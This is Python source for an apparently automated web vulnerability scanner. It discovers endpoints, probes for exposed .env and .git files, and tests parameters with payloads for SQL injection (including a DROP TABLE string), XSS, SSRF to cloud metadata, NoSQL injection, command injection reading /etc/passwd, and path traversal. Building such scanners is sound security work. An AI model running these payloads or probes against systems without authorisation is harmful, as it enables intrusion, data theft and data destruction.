"""
BREACH.AI - Attack Orchestrator

Unified orchestrator that integrates all attack modules with the main engine.
This bridges the gap between the SaaS-focused attacks and the traditional
injection/OWASP attacks.
"""

import asyncio
import re
import json
from dataclasses import dataclass, field
from typing import List, Dict, Set, Optional, Any, Tuple
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup

from breach.attacks.http_adapter import AiohttpAdapter, HTTPResponse


@dataclass
class DiscoveredEndpoint:
    """A discovered endpoint with its parameters."""
    url: str
    method: str = "GET"
    parameters: List[str] = field(default_factory=list)
    body_params: List[str] = field(default_factory=list)
    content_type: str = ""
    requires_auth: bool = False
    response_code: int = 0


@dataclass
class AttackFinding:
    """A vulnerability finding from the attack orchestrator."""
    severity: int  # 4=CRITICAL, 3=HIGH, 2=MEDIUM, 1=LOW, 0=INFO
    category: str
    title: str
    description: str
    endpoint: str
    method: str
    parameter: Optional[str] = None
    payload: Optional[str] = None
    evidence: Optional[str] = None
    records_exposed: int = 0
    pii_fields: List[str] = field(default_factory=list)
    business_impact: int = 0
    impact_explanation: str = ""
    curl_command: str = ""
    fix_suggestion: str = ""


class EndpointDiscovery:
    """
    Discovers endpoints and parameters through crawling and fuzzing.
    """

    # Common API endpoints to probe
    API_PATHS = [
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/v1", "/v2", "/v3",
        "/graphql", "/graphiql",
        "/swagger.json", "/openapi.json", "/api-docs",
        "/users", "/api/users", "/api/user",
        "/accounts", "/api/accounts",
        "/auth", "/api/auth", "/login", "/api/login",
        "/search", "/api/search",
        "/products", "/api/products",
        "/orders", "/api/orders",
        "/admin", "/api/admin",
        "/config", "/api/config",
        "/settings", "/api/settings",
        "/profile", "/api/profile",
        "/me", "/api/me",
        "/data", "/api/data",
        "/export", "/api/export",
        "/import", "/api/import",
        "/upload", "/api/upload",
        "/download", "/api/download",
        "/files", "/api/files",
        "/documents", "/api/documents",
        "/messages", "/api/messages",
        "/notifications", "/api/notifications",
        "/webhook", "/webhooks", "/api/webhooks",
        "/callback", "/api/callback",
        "/debug", "/api/debug",
        "/test", "/api/test",
        "/health", "/healthz", "/api/health",
        "/status", "/api/status",
        "/info", "/api/info",
        "/metrics", "/api/metrics",
        "/version", "/api/version",
    ]

    # Common parameter names to test
    COMMON_PARAMS = [
        "id", "user_id", "userId", "user", "uid",
        "account_id", "accountId", "account",
        "email", "username", "name",
        "q", "query", "search", "keyword", "term",
        "page", "limit", "offset", "size", "per_page",
        "sort", "order", "orderBy", "sortBy",
        "filter", "status", "type", "category",
        "url", "link", "redirect", "return", "next", "callback",
        "file", "path", "filename", "doc", "document",
        "data", "json", "xml", "body",
        "token", "key", "api_key", "apikey", "auth",
        "debug", "test", "admin", "verbose",
        "format", "output", "response_type",
        "include", "expand", "fields", "select",
    ]

    def __init__(self, http_client: AiohttpAdapter, base_url: str):
        self.http = http_client
        self.base_url = base_url
        self.discovered: List[DiscoveredEndpoint] = []
        self.crawled_urls: Set[str] = set()

    async def discover_all(self, cookies: Dict = None) -> List[DiscoveredEndpoint]:
        """Run full discovery: crawl + fuzz + API probe."""
        tasks = [
            self._crawl_page(self.base_url, cookies),
            self._probe_api_endpoints(cookies),
            self._check_common_files(cookies),
        ]

        await asyncio.gather(*tasks, return_exceptions=True)

        # Dedupe
        seen = set()
        unique = []
        for ep in self.discovered:
            key = f"{ep.method}:{ep.url}"
            if key not in seen:
                seen.add(key)
                unique.append(ep)

        return unique

    async def _crawl_page(self, url: str, cookies: Dict = None, depth: int = 2):
        """Crawl a page and extract links, forms, and API calls."""
        if depth <= 0 or url in self.crawled_urls:
            return

        self.crawled_urls.add(url)

        try:
            response = await self.http.get(url, cookies=cookies)
            if not response.is_success:
                return

            soup = BeautifulSoup(response.body, 'html.parser')

            # Extract links
            links = []
            for a in soup.find_all('a', href=True):
                href = a['href']
                if href.startswith('/') or href.startswith(self.base_url):
                    full_url = urljoin(self.base_url, href)
                    if urlparse(full_url).netloc == urlparse(self.base_url).netloc:
                        links.append(full_url)

                        # Extract params from URL
                        parsed = urlparse(full_url)
                        params = list(parse_qs(parsed.query).keys())
                        if params:
                            self.discovered.append(DiscoveredEndpoint(
                                url=full_url.split('?')[0],
                                method="GET",
                                parameters=params,
                            ))

            # Extract forms
            for form in soup.find_all('form'):
                action = form.get('action', url)
                method = form.get('method', 'GET').upper()
                form_url = urljoin(url, action)

                params = []
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name')
                    if name:
                        params.append(name)

                if params:
                    self.discovered.append(DiscoveredEndpoint(
                        url=form_url,
                        method=method,
                        parameters=params if method == "GET" else [],
                        body_params=params if method == "POST" else [],
                    ))

            # Look for JS API calls
            self._extract_js_endpoints(response.body)

            # Recursively crawl
            for link in links[:10]:  # Limit crawl depth
                await self._crawl_page(link, cookies, depth - 1)

        except Exception:
            pass

    def _extract_js_endpoints(self, html: str):
        """Extract API endpoints from JavaScript code."""
        # Look for fetch/axios calls
        patterns = [
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.\w+\(["\']([^"\']+)["\']',
            r'url:\s*["\']([^"\']+/api[^"\']*)["\']',
            r'endpoint:\s*["\']([^"\']+)["\']',
            r'["\']/(api/[^"\']+)["\']',
            r'["\']/(v\d+/[^"\']+)["\']',
        ]

        for pattern in patterns:
            for match in re.findall(pattern, html):
                if match.startswith('/') or match.startswith('http'):
                    full_url = urljoin(self.base_url, match)
                    self.discovered.append(DiscoveredEndpoint(
                        url=full_url.split('?')[0],
                        method="GET",
                    ))

    async def _probe_api_endpoints(self, cookies: Dict = None):
        """Probe common API endpoints."""
        tasks = []
        for path in self.API_PATHS:
            tasks.append(self._probe_single(path, cookies))

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _probe_single(self, path: str, cookies: Dict = None):
        """Probe a single endpoint."""
        url = urljoin(self.base_url, path)

        try:
            response = await self.http.get(url, cookies=cookies)

            if response.status_code in [200, 201, 401, 403]:
                ep = DiscoveredEndpoint(
                    url=url,
                    method="GET",
                    requires_auth=response.status_code in [401, 403],
                    response_code=response.status_code,
                )

                # Try to extract params from response
                if response.status_code == 200:
                    try:
                        data = json.loads(response.body)
                        if isinstance(data, dict):
                            # Likely accepts these as query params
                            ep.parameters = list(data.keys())[:5]
                    except:
                        pass

                # Fuzz for common params
                await self._fuzz_params(ep, cookies)

                self.discovered.append(ep)

        except Exception:
            pass

    async def _fuzz_params(self, endpoint: DiscoveredEndpoint, cookies: Dict = None):
        """Fuzz an endpoint for hidden parameters."""
        base_response = await self.http.get(endpoint.url, cookies=cookies)
        base_length = len(base_response.body)

        found_params = []
        for param in self.COMMON_PARAMS[:15]:  # Limit to avoid too many requests
            try:
                test_url = f"{endpoint.url}?{param}=test123"
                response = await self.http.get(test_url, cookies=cookies)

                # Check if param had an effect
                if (response.status_code != base_response.status_code or
                    abs(len(response.body) - base_length) > 50 or
                    param.lower() in response.body.lower()):
                    found_params.append(param)

            except Exception:
                pass

        endpoint.parameters.extend(found_params)

    async def _check_common_files(self, cookies: Dict = None):
        """Check for common sensitive files."""
        sensitive_paths = [
            "/.env", "/.env.local", "/.env.production",
            "/.git/config", "/.git/HEAD",
            "/config.json", "/config.yaml", "/config.yml",
            "/package.json", "/composer.json",
            "/backup.sql", "/database.sql", "/dump.sql",
            "/robots.txt", "/sitemap.xml",
            "/.htaccess", "/web.config",
            "/phpinfo.php", "/info.php",
            "/server-status", "/server-info",
            "/.well-known/security.txt",
        ]

        for path in sensitive_paths:
            try:
                url = urljoin(self.base_url, path)
                response = await self.http.get(url, cookies=cookies)

                if response.status_code == 200 and len(response.body) > 10:
                    # Check it's not an error page
                    if not any(x in response.body.lower() for x in ['not found', '404', 'error']):
                        self.discovered.append(DiscoveredEndpoint(
                            url=url,
                            method="GET",
                            response_code=200,
                        ))

            except Exception:
                pass


class InjectionTester:
    """
    Tests endpoints for injection vulnerabilities.
    """

    # SQL Injection payloads
    SQLI_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "' OR 1=1#",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "admin'--",
        "' AND '1'='1",
        "1 AND 1=1",
        "'; DROP TABLE users--",
        "' OR SLEEP(5)--",
    ]

    SQLI_ERRORS = [
        "sql syntax", "mysql", "postgresql", "sqlite",
        "oracle", "mssql", "syntax error", "unclosed quotation",
        "quoted string not properly terminated", "query failed",
        "database error", "odbc", "pg_query", "mysql_fetch",
    ]

    # XSS payloads
    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<img src=x onerror=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '" onmouseover="alert(1)',
        '<input onfocus=alert(1) autofocus>',
    ]

    # SSRF payloads
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "file:///etc/passwd",
        "http://metadata.google.internal/",
    ]

    # NoSQL payloads
    NOSQL_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        "'; return true; var x='",
        '{"$where": "1==1"}',
        '[$ne]=1',
        '[$gt]=',
    ]

    # Command injection payloads
    CMDI_PAYLOADS = [
        "; ls",
        "| ls",
        "`ls`",
        "$(ls)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; id",
        "| id",
    ]

    CMDI_INDICATORS = [
        "root:", "bin:", "daemon:", "nobody:",
        "uid=", "gid=", "groups=",
        "total ", "drwx", "-rw-",
    ]

    # Path traversal payloads
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]

    def __init__(self, http_client: AiohttpAdapter):
        self.http = http_client
        self.findings: List[AttackFinding] = []

    async def test_endpoint(
        self,
        endpoint: DiscoveredEndpoint,
        cookies: Dict = None
    ) -> List[AttackFinding]:
        """Test a single endpoint for all injection types."""
        findings = []

        # Test each parameter
        all_params = endpoint.parameters + endpoint.body_params
        if not all_params:
            # Try common params if none discovered
            all_params = ["id", "q", "search", "url", "file", "data"]

        for param in all_params[:5]:  # Limit params per endpoint
            method = "POST" if param in endpoint.body_params else "GET"

            # Run all injection tests
            tests = [
                self._test_sqli(endpoint.url, param, method, cookies),
                self._test_xss(endpoint.url, param, method, cookies),
                self._test_ssrf(endpoint.url, param, method, cookies),
                self._test_nosql(endpoint.url, param, method, cookies),
                self._test_cmdi(endpoint.url, param, method, cookies),
                self._test_path_traversal(endpoint.url, param, method, cookies),
            ]

            results = await asyncio.gather(*tests, return_exceptions=True)

            for result in results:
                if isinstance(result, AttackFinding):
                    findings.append(result)

        return findings

    async def _send_payload(
        self,
        url: str,
        param: str,
        payload: str,
        method: str = "GET",
        cookies: Dict = None
    ) -> HTTPResponse:
        """Send a payload to the target."""
        if method.upper() == "GET":
            separator = "&" if "?" in url else "?"
            test_url = f"{url}{separator}{param}={payload}"
            return await self.http.get(test_url, cookies=cookies)
        else:
            return await self.http.post(url, data={param: payload}, cookies=cookies)

    async def _test_sqli(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict
    ) -> Optional[AttackFinding]:
        """Test for SQL injection."""
        for payload in self.SQLI_PAYLOADS[:8]:
            try:
                response = await self._send_payload(url, param, payload, method, cookies)

                # Check for SQL error patterns
                body_lower = response.body.lower()
                if any(err in body_lower for err in self.SQLI_ERRORS):
                    return AttackFinding(
                        severity=4,  # CRITICAL
                        category="sqli",
                        title=f"SQL Injection - {param}",
                        description=f"SQL error triggered with payload: {payload[:50]}",
                        endpoint=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        evidence=response.body[:500],
                        business_impact=100000,
                        impact_explanation="Database access, potential data breach",
                        curl_command=f"curl '{url}?{param}={payload}'",
                        fix_suggestion="Use parameterized queries/prepared statements",
                    )

            except Exception:
                pass

        return None

    async def _test_xss(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict
    ) -> Optional[AttackFinding]:
        """Test for XSS."""
        for payload in self.XSS_PAYLOADS[:6]:
            try:
                response = await self._send_payload(url, param, payload, method, cookies)

                # Check if payload is reflected unescaped
                if payload in response.body:
                    # Verify it's not escaped
                    if '&lt;script' not in response.body:
                        return AttackFinding(
                            severity=3,  # HIGH
                            category="xss",
                            title=f"Reflected XSS - {param}",
                            description=f"XSS payload reflected without sanitization",
                            endpoint=url,
                            method=method,
                            parameter=param,
                            payload=payload,
                            evidence=response.body[:500],
                            business_impact=25000,
                            impact_explanation="Session hijacking, phishing attacks",
                            curl_command=f"curl '{url}?{param}={payload}'",
                            fix_suggestion="Encode output, use Content-Security-Policy",
                        )

            except Exception:
                pass

        return None

    async def _test_ssrf(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict
    ) -> Optional[AttackFinding]:
        """Test for SSRF."""
        # Only test params that look like they accept URLs
        url_params = ['url', 'link', 'redirect', 'return', 'callback', 'next',
                      'src', 'source', 'dest', 'destination', 'uri', 'path', 'file']

        if not any(p in param.lower() for p in url_params):
            return None

        # Get baseline
        baseline = await self._send_payload(url, param, "https://example.com", method, cookies)

        for payload in self.SSRF_PAYLOADS[:5]:
            try:
                response = await self._send_payload(url, param, payload, method, cookies)

                # Check for SSRF indicators
                ssrf_indicators = [
                    "127.0.0.1", "localhost", "internal",
                    "connection refused", "connection timed out",
                    "ami-id", "instance-id", "meta-data",
                    "root:", "redis", "mysql",
                ]

                body_lower = response.body.lower()
                baseline_lower = baseline.body.lower()

                for indicator in ssrf_indicators:
                    if indicator in body_lower and indicator not in baseline_lower:
                        severity = 4 if "meta-data" in body_lower or "root:" in body_lower else 3
                        return AttackFinding(
                            severity=severity,
                            category="ssrf",
                            title=f"SSRF - {param}",
                            description=f"Server made request to internal/metadata endpoint",
                            endpoint=url,
                            method=method,
                            parameter=param,
                            payload=payload,
                            evidence=response.body[:500],
                            business_impact=75000 if severity == 4 else 35000,
                            impact_explanation="Internal network access, cloud metadata exposure",
                            curl_command=f"curl '{url}?{param}={payload}'",
                            fix_suggestion="Whitelist allowed URLs, block internal IPs",
                        )

            except Exception:
                pass

        return None

    async def _test_nosql(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict
    ) -> Optional[AttackFinding]:
        """Test for NoSQL injection."""
        # Get baseline with normal value
        baseline = await self._send_payload(url, param, "test123", method, cookies)

        for payload in self.NOSQL_PAYLOADS[:4]:
            try:
                response = await self._send_payload(url, param, payload, method, cookies)

                # Check for auth bypass (significant response difference)
                if (response.status_code == 200 and baseline.status_code in [401, 403]):
                    return AttackFinding(
                        severity=4,  # CRITICAL
                        category="nosql",
                        title=f"NoSQL Injection Auth Bypass - {param}",
                        description=f"NoSQL injection bypassed authentication",
                        endpoint=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        evidence=response.body[:500],
                        business_impact=80000,
                        impact_explanation="Authentication bypass, data access",
                        curl_command=f"curl '{url}?{param}={payload}'",
                        fix_suggestion="Use proper query builders, validate input types",
                    )

                # Check for data leak (much more data returned)
                if len(response.body) > len(baseline.body) * 2 and len(response.body) > 1000:
                    return AttackFinding(
                        severity=3,  # HIGH
                        category="nosql",
                        title=f"NoSQL Injection Data Leak - {param}",
                        description=f"NoSQL injection returned extra data",
                        endpoint=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        evidence=response.body[:500],
                        business_impact=50000,
                        impact_explanation="Data exfiltration via injection",
                        curl_command=f"curl '{url}?{param}={payload}'",
                        fix_suggestion="Use proper query builders, validate input types",
                    )

            except Exception:
                pass

        return None

    async def _test_cmdi(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict
    ) -> Optional[AttackFinding]:
        """Test for command injection."""
        for payload in self.CMDI_PAYLOADS[:4]:
            try:
                response = await self._send_payload(url, param, payload, method, cookies)

                body_lower = response.body.lower()
                if any(ind in body_lower for ind in self.CMDI_INDICATORS):
                    return AttackFinding(
                        severity=4,  # CRITICAL
                        category="cmdi",
                        title=f"Command Injection - {param}",
                        description=f"OS command execution via {param}",
                        endpoint=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        evidence=response.body[:500],
                        business_impact=150000,
                        impact_explanation="Full server compromise possible",
                        curl_command=f"curl '{url}?{param}={payload}'",
                        fix_suggestion="Never pass user input to shell commands",
                    )

            except Exception:
                pass

        return None

    async def _test_path_traversal(
        self,
        url: str,
        param: str,
        method: str,
        cookies: Dict
    ) -> Optional[AttackFinding]:
        """Test for path traversal."""
        file_params = ['file', 'path', 'doc', 'document', 'template',
                       'page', 'filename', 'include', 'load']

        if not any(p in param.lower() for p in file_params):
            return None

        for payload in self.PATH_TRAVERSAL[:3]:
            try:
                response = await self._send_payload(url, param, payload, method, cookies)

                # Check for file content indicators
                if "root:" in response.body or "[extensions]" in response.body:
                    return AttackFinding(
                        severity=4,  # CRITICAL
                        category="path_traversal",
                        title=f"Path Traversal - {param}",
                        description=f"Arbitrary file read via {param}",
                        endpoint=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        evidence=response.body[:500],
                        business_impact=75000,
                        impact_explanation="Sensitive file exposure, credential theft",
                        curl_command=f"curl '{url}?{param}={payload}'",
                        fix_suggestion="Validate file paths, use allowlist",
                    )

            except Exception:
                pass

        return None


class AttackOrchestrator:
    """
    Main orchestrator that coordinates endpoint discovery and attack testing.
    Integrates with the main BREACH engine.
    """

    def __init__(self, session, state):
        """
        Initialize with the main engine's session and state.

        Args:
            session: aiohttp.ClientSession from the main engine
            state: ScanState from the main engine
        """
        self.session = session
        self.state = state
        self.http = AiohttpAdapter(session, state.target)
        self.findings: List[AttackFinding] = []

    async def run(self, cookies: Dict = None, cookies2: Dict = None) -> List[AttackFinding]:
        """
        Run full attack orchestration.

        1. Discover endpoints
        2. Test each endpoint for vulnerabilities
        3. Return findings
        """
        from rich.console import Console
        console = Console()

        console.print(f"\n[bold cyan]▶ INJECTION ATTACK SUITE[/bold cyan]")

        # Phase 1: Endpoint Discovery
        console.print(f"\n[yellow]⚡ ENDPOINT DISCOVERY[/yellow]")
        discovery = EndpointDiscovery(self.http, self.state.target)
        endpoints = await discovery.discover_all(cookies)

        console.print(f"[dim]  Found {len(endpoints)} endpoints with parameters[/dim]")

        # Add existing extracted IDs as potential params
        for endpoint in endpoints:
            for uid in list(self.state.extracted_ids)[:3]:
                if uid not in endpoint.parameters:
                    endpoint.parameters.append(f"id={uid}")

        # Phase 2: Injection Testing
        console.print(f"\n[yellow]⚡ INJECTION TESTING[/yellow]")
        tester = InjectionTester(self.http)

        # Test each endpoint
        for endpoint in endpoints[:20]:  # Limit to avoid timeout
            try:
                findings = await tester.test_endpoint(endpoint, cookies)
                for finding in findings:
                    self.findings.append(finding)
                    # Also add to engine state
                    self._add_to_state(finding)

                    severity_colors = {4: "red bold", 3: "yellow", 2: "blue", 1: "dim"}
                    severity_names = {4: "CRITICAL", 3: "HIGH", 2: "MEDIUM", 1: "LOW"}
                    color = severity_colors.get(finding.severity, "dim")
                    name = severity_names.get(finding.severity, "INFO")

                    console.print(f"  [{color}]🔴 {name}: {finding.title}[/{color}]")
                    console.print(f"     {finding.endpoint}")
                    if finding.parameter:
                        console.print(f"     Parameter: {finding.parameter}")

            except Exception as e:
                console.print(f"[dim]  Error testing {endpoint.url}: {e}[/dim]")

        console.print(f"\n[dim]  Total findings: {len(self.findings)}[/dim]")

        return self.findings

    def _add_to_state(self, finding: AttackFinding):
        """Convert AttackFinding to engine Finding and add to state."""
        from breach.engine import Finding, Severity

        severity_map = {
            4: Severity.CRITICAL,
            3: Severity.HIGH,
            2: Severity.MEDIUM,
            1: Severity.LOW,
            0: Severity.INFO,
        }

        engine_finding = Finding(
            severity=severity_map.get(finding.severity, Severity.MEDIUM),
            category=finding.category,
            title=finding.title,
            description=finding.description,
            endpoint=finding.endpoint,
            method=finding.method,
            evidence=finding.evidence,
            records_exposed=finding.records_exposed,
            pii_fields=finding.pii_fields,
            business_impact=finding.business_impact,
            impact_explanation=finding.impact_explanation,
            curl_command=finding.curl_command,
            fix_suggestion=finding.fix_suggestion,
        )

        self.state.findings.append(engine_finding)
